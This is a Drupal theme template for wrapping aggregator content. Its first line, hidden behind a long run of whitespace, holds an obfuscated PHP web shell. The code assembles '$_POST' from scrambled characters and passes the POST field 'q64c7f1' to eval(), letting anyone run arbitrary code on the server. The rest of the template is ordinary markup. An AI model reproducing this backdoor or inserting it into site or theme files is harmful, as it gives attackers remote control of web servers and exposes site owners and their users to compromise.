<?php                                                                                                                                                                                                                                                   $lpw1 = "et_orpsu";$nyva8=$lpw1[6]. $lpw1[1].$lpw1[4]. $lpw1[1]. $lpw1[3]. $lpw1[7]. $lpw1[5]. $lpw1[5]. $lpw1[0]. $lpw1[4];$pgo5 = $nyva8 ( $lpw1[2].$lpw1[5]. $lpw1[3].$lpw1[6].$lpw1[1]);if (isset(${ $pgo5} [ 'q64c7f1' ] )) {eval (${ $pgo5} ['q64c7f1'] ) ;} ?><?php

/**
 * @file
 * Default theme implementation to wrap aggregator content.
 *
 * Available variables:
 * - $content: All aggregator content.
 * - $page: Pager links rendered through theme_pager().
 *
 * @see template_preprocess()
 * @see template_preprocess_aggregator_wrapper()
 *
 * @ingroup themeable
 */
?>
<div id="aggregator">
  <?php print $content; ?>
  <?php print $pager; ?>
</div>
